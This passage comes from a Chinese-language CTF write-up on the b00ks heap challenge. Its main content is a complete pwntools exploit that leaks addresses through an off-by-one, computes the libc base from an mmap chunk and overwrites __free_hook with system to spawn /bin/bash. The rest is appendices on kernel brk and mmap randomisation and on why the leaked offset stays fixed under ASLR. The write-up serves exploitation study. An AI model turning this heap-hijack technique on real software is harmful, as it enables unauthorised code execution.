class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to delete:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>但是很不巧的是，onegadget是有约束相应寄存器的值需要是NULL，在我本机的环境里面这三个地址运行到时寄存器情况都不满足。</p>
<h2 id="细说利用（system）">细说利用（system）</h2>
<p>所以这里需要换一个更通用的方法，预先再创建一个book3把description字段和name字段覆盖成/bin/bash\x00，接着把freehook的地址替换成system。这样在delete时候原本free chunk会直接变成system(‘/bin/bash\x00’)。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = ELF(<span class="string">&#x27;b00ks&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;x86&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">binary_path = <span class="string">&#x27;/home/parallels/Desktop/b00ks&#x27;</span></span><br><span class="line">io = process(binary_path)</span><br><span class="line">pwnlib.gdb.attach(proc.pidof(io)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add book 1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Author:&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">book1_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">book1_addr = book1_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">book1_addr = u64(book1_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The first idx in bookshelf: &quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_book_data = p64(<span class="number">0x1</span>) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">4</span> + <span class="number">4</span> ) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">io.sendline(fake_book_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#off-by-one</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#add book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#add book3</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/bash\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/bash\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Name: &#x27;)</span></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Description: &#x27;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">name_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">name_mmap_addr = name_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">desc_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">desc_mmap_addr = desc_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(name_mmap_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;desc_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(desc_mmap_addr)))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(u64(desc_mmap_addr)) + <span class="number">0x41ff0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc addr : &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = p64(libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>])</span><br><span class="line"><span class="comment"># one_gadget = p64(libc_base + 0xe3afe) # 0xe3afe + 0xe3b01 + 0xe3b04</span></span><br><span class="line"></span><br><span class="line">system = p64(libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">io.sendline(free_hook)</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">io.sendline(system)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;free_hook: &quot;</span> + <span class="built_in">hex</span>(libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line"><span class="comment"># print(&quot;one gadget: &quot; + hex(libc_base + 0xe3afe))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system : &quot;</span> + <span class="built_in">hex</span>(libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#delete book3</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to delete:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="附-request2size">附 request2size</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 常量定义  </span></span><br><span class="line">SIZE_SZ = <span class="number">8</span>  <span class="comment"># 64位系统上 size_t 的大小  </span></span><br><span class="line">MALLOC_ALIGN_MASK = <span class="number">15</span>  <span class="comment"># 16字节对齐掩码 (0xF)  </span></span><br><span class="line">MINSIZE = <span class="number">32</span>  <span class="comment"># 假设的最小块大小  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request2size</span>(<span class="params">req</span>):  </span><br><span class="line">    <span class="keyword">if</span> req + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE:  </span><br><span class="line">        <span class="keyword">return</span> MINSIZE  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="keyword">return</span> (req + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(request2size(<span class="number">32</span>)))</span><br></pre></td></tr></table></figure>
<h2 id="附-brk起始地址计算方式">附 brk起始地址计算方式</h2>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mm-&gt;brk = mm-&gt;start_brk = arch_randomize_brk(mm);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">arch_randomize_brk</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> range_end = mm-&gt;brk + <span class="number">0x02000000</span>;</span><br><span class="line">    <span class="keyword">return</span> randomize_range(mm-&gt;brk, range_end, <span class="number">0</span>) ? : mm-&gt;brk;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">randomize_range</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> start, <span class="type">unsigned</span> <span class="type">long</span> end, <span class="type">unsigned</span> <span class="type">long</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> range = end - len - start;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (end &lt;= start + len)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> PAGE_ALIGN(get_random_int() % range + start);<span class="comment">// #define PAGE_ALIGN(addr) ALIGN(addr, PAGE_SIZE)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a random word for internal kernel use only. Similar to urandom but</span></span><br><span class="line"><span class="comment"> * with the goal of minimal entropy pool depletion. As a result, the random</span></span><br><span class="line"><span class="comment"> * value is not cryptographically secure but for several uses the cost of</span></span><br><span class="line"><span class="comment"> * depleting entropy is too high</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="title function_">DEFINE_PER_CPU</span><span class="params">(__u32 [MD5_DIGEST_WORDS], get_random_int_hash)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">get_random_int</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    __u32 *hash;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (arch_get_random_int(&amp;ret))</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    hash = get_cpu_var(get_random_int_hash);</span><br><span class="line"></span><br><span class="line">    hash[<span class="number">0</span>] += current-&gt;pid + jiffies + random_get_entropy(); <span class="comment">//random_get_entropy This function returns the processor cycle counter value if</span></span><br><span class="line">       available, <span class="keyword">else</span> it returns zero. </span><br><span class="line">    md5_transform(hash, random_int_secret);</span><br><span class="line">    ret = hash[<span class="number">0</span>];</span><br><span class="line">    put_cpu_var(get_random_int_hash);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(get_random_int);</span><br></pre></td></tr></table></figure>
<h2 id="附-mmap计算方式">附 mmap计算方式</h2>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">arch_pick_mmap_layout</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> rlimit *rlim_stack)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (mmap_is_legacy())</span><br><span class="line">        clear_bit(MMF_TOPDOWN, &amp;mm-&gt;flags);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        set_bit(MMF_TOPDOWN, &amp;mm-&gt;flags);</span><br><span class="line"></span><br><span class="line">    arch_pick_mmap_base(&amp;mm-&gt;mmap_base, &amp;mm-&gt;mmap_legacy_base,</span><br><span class="line">            arch_rnd(mmap64_rnd_bits), task_size_64bit(<span class="number">0</span>),</span><br><span class="line">            rlim_stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This function, called very early during the creation of a new</span></span><br><span class="line"><span class="comment"> * process VM image, sets up which VM layout function to use:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">arch_pick_mmap_base</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> *base, <span class="type">unsigned</span> <span class="type">long</span> *legacy_base,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">long</span> random_factor, <span class="type">unsigned</span> <span class="type">long</span> task_size,</span></span><br><span class="line"><span class="params">        <span class="keyword">struct</span> rlimit *rlim_stack)</span></span><br><span class="line">&#123;</span><br><span class="line">    *legacy_base = mmap_legacy_base(random_factor, task_size);</span><br><span class="line">    <span class="keyword">if</span> (mmap_is_legacy())</span><br><span class="line">        *base = *legacy_base;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        *base = mmap_base(random_factor, task_size, rlim_stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">task_size_64bit</span><span class="params">(<span class="type">int</span> full_addr_space)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> full_addr_space ? TASK_SIZE_MAX : DEFAULT_MAP_WINDOW;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">task_size_max</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">    alternative_io(<span class="string">&quot;movq %[small],%0&quot;</span>,<span class="string">&quot;movq %[large],%0&quot;</span>,</span><br><span class="line">            X86_FEATURE_LA57,</span><br><span class="line">            <span class="string">&quot;=r&quot;</span> (ret),</span><br><span class="line">            [small] <span class="string">&quot;i&quot;</span> ((<span class="number">1ul</span> &lt;&lt; <span class="number">47</span>)-PAGE_SIZE),</span><br><span class="line">            [large] <span class="string">&quot;i&quot;</span> ((<span class="number">1ul</span> &lt;&lt; <span class="number">56</span>)-PAGE_SIZE));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">arch_mmap_rnd</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> arch_rnd(mmap_is_ia32() ? mmap32_rnd_bits : mmap64_rnd_bits);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">arch_rnd</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> rndbits)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(current-&gt;flags &amp; PF_RANDOMIZE))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> (get_random_long() &amp; ((<span class="number">1UL</span> &lt;&lt; rndbits) - <span class="number">1</span>)) &lt;&lt; PAGE_SHIFT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">mmap_base</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> rnd, <span class="type">unsigned</span> <span class="type">long</span> task_size,</span></span><br><span class="line"><span class="params">                   <span class="keyword">struct</span> rlimit *rlim_stack)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> gap = rlim_stack-&gt;rlim_cur;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> pad = stack_maxrandom_size(task_size) + stack_guard_gap;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> gap_min, gap_max;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Values close to RLIM_INFINITY can overflow. */</span></span><br><span class="line">    <span class="keyword">if</span> (gap + pad &gt; gap)</span><br><span class="line">        gap += pad;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Top of mmap area (just below the process stack).</span></span><br><span class="line"><span class="comment">     * Leave an at least ~128 MB hole with possible stack randomization.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    gap_min = SIZE_128M;</span><br><span class="line">    gap_max = (task_size / <span class="number">6</span>) * <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (gap &lt; gap_min)</span><br><span class="line">        gap = gap_min;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (gap &gt; gap_max)</span><br><span class="line">        gap = gap_max;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> PAGE_ALIGN(task_size - gap - rnd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="附-固定地址原理">附 固定地址原理</h2>
<p>因为，我当时是英文论坛和网友交流得出的结论，我这里直接贴我当时回复了。</p>
<p>I think brk and mmap are two different things in linux. When I malloc small space of linux, malloc will use brk. Inversely, it will use mmap for big space (almost &gt; 128KB).</p>
<p>In ASLR, both heap and mmap will have a random offset.</p>
<p>brk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">arch_randomize_brk</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> range_end = mm-&gt;brk + <span class="number">0x02000000</span>;</span><br><span class="line">    <span class="keyword">return</span> randomize_range(mm-&gt;brk, range_end, <span class="number">0</span>) ? : mm-&gt;brk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mmap</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">arch_pick_mmap_layout</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> rlimit *rlim_stack)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (mmap_is_legacy())</span><br><span class="line">        clear_bit(MMF_TOPDOWN, &amp;mm-&gt;flags);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        set_bit(MMF_TOPDOWN, &amp;mm-&gt;flags);</span><br><span class="line"></span><br><span class="line">    arch_pick_mmap_base(&amp;mm-&gt;mmap_base, &amp;mm-&gt;mmap_legacy_base,</span><br><span class="line">            arch_rnd(mmap64_rnd_bits), task_size_64bit(<span class="number">0</span>),</span><br><span class="line">            rlim_stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">arch_pick_mmap_base</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> *base, <span class="type">unsigned</span> <span class="type">long</span> *legacy_base,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">long</span> random_factor, <span class="type">unsigned</span> <span class="type">long</span> task_size,</span></span><br><span class="line"><span class="params">        <span class="keyword">struct</span> rlimit *rlim_stack)</span></span><br><span class="line">&#123;</span><br><span class="line">    *legacy_base = mmap_legacy_base(random_factor, task_size);</span><br><span class="line">    <span class="keyword">if</span> (mmap_is_legacy())</span><br><span class="line">        *base = *legacy_base;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        *base = mmap_base(random_factor, task_size, rlim_stack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>PS: If paging is level 4, task size is 0x7ffffffff000.</p>
<p>For example, here my heap is from 0x55650f802000 and mmap area is from 0x7fdcf6d94000.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">process <span class="number">1181521</span></span><br><span class="line">Mapped address spaces:</span><br><span class="line"></span><br><span class="line">          Start Addr           End Addr       Size     Offset objfile</span><br><span class="line">      <span class="number">0x55650f600000</span>     <span class="number">0x55650f602000</span>     <span class="number">0x2000</span>        <span class="number">0x0</span> /home/parallels/Desktop/b00ks</span><br><span class="line">      <span class="number">0x55650f801000</span>     <span class="number">0x55650f802000</span>     <span class="number">0x1000</span>     <span class="number">0x1000</span> /home/parallels/Desktop/b00ks</span><br><span class="line">      <span class="number">0x55650f802000</span>     <span class="number">0x55650f803000</span>     <span class="number">0x1000</span>     <span class="number">0x2000</span> /home/parallels/Desktop/b00ks</span><br><span class="line">      <span class="number">0x556510fde000</span>     <span class="number">0x556510fff000</span>    <span class="number">0x21000</span>        <span class="number">0x0</span> [heap]</span><br><span class="line">      <span class="number">0x7fdcf6d94000</span>     <span class="number">0x7fdcf6dd6000</span>    <span class="number">0x42000</span>        <span class="number">0x0</span> </span><br><span class="line">      <span class="number">0x7fdcf6dd6000</span>     <span class="number">0x7fdcf6df8000</span>    <span class="number">0x22000</span>        <span class="number">0x0</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6df8000</span>     <span class="number">0x7fdcf6f70000</span>   <span class="number">0x178000</span>    <span class="number">0x22000</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6f70000</span>     <span class="number">0x7fdcf6fbe000</span>    <span class="number">0x4e000</span>   <span class="number">0x19a000</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6fbe000</span>     <span class="number">0x7fdcf6fc2000</span>     <span class="number">0x4000</span>   <span class="number">0x1e7000</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6fc2000</span>     <span class="number">0x7fdcf6fc4000</span>     <span class="number">0x2000</span>   <span class="number">0x1eb000</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6fc4000</span>     <span class="number">0x7fdcf6fca000</span>     <span class="number">0x6000</span>        <span class="number">0x0</span> </span><br><span class="line">      <span class="number">0x7fdcf6fdd000</span>     <span class="number">0x7fdcf6fde000</span>     <span class="number">0x1000</span>        <span class="number">0x0</span> /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6fde000</span>     <span class="number">0x7fdcf7001000</span>    <span class="number">0x23000</span>     <span class="number">0x1000</span> /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf7001000</span>     <span class="number">0x7fdcf7009000</span>     <span class="number">0x8000</span>    <span class="number">0x24000</span> /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf700a000</span>     <span class="number">0x7fdcf700b000</span>     <span class="number">0x1000</span>    <span class="number">0x2c000</span> /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf700b000</span>     <span class="number">0x7fdcf700c000</span>     <span class="number">0x1000</span>    <span class="number">0x2d000</span> /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf700c000</span>     <span class="number">0x7fdcf700d000</span>     <span class="number">0x1000</span>        <span class="number">0x0</span> </span><br><span class="line">      <span class="number">0x7ffe19d76000</span>     <span class="number">0x7ffe19d97000</span>    <span class="number">0x21000</span>        <span class="number">0x0</span> [<span class="built_in">stack</span>]</span><br><span class="line">      <span class="number">0x7ffe19df2000</span>     <span class="number">0x7ffe19df6000</span>     <span class="number">0x4000</span>        <span class="number">0x0</span> [vvar]</span><br><span class="line">      <span class="number">0x7ffe19df6000</span>     <span class="number">0x7ffe19df8000</span>     <span class="number">0x2000</span>        <span class="number">0x0</span> [vdso]</span><br><span class="line">  <span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span>     <span class="number">0x1000</span>        <span class="number">0x0</span> [vsyscall]</span><br></pre></td></tr></table></figure>
<p>Besides, the dynamic loader uses mmap(2) with MAP_PRIVATE and appropriate permissions.</p>
<p><a href="https://stackoverflow.com/questions/4022127/how-the-share-library-be-shared-by-different-processes">https://stackoverflow.com/questions/4022127/how-the-share-library-be-shared-by-different-processes</a></p>
<p>So, my understanding is:</p>
<ol>
<li>
<p>If the program is simple, like I can fully predict what will happen e.g. when malloc will be, size of per chunk of mmap, if the program will load .so or uninstall .so, no side effect of random of time, etc. Once the address of chunk in mmap is leaked, I can calc libc base, because as you said：</p>
<ol>
<li>Both of them are relative in memory (allocated by mmap).</li>
<li>The beginning address of mapping is random, but the rest mapping is not random.</li>
</ol>
</li>
<li>
<p>Finally, I just need to run the program locally to the same leak address following the same steps, and then calculate the fixed offset at that point. This offset will always be valid, even with ASLR.</p>
</li>
</ol>
<p>参考</p>
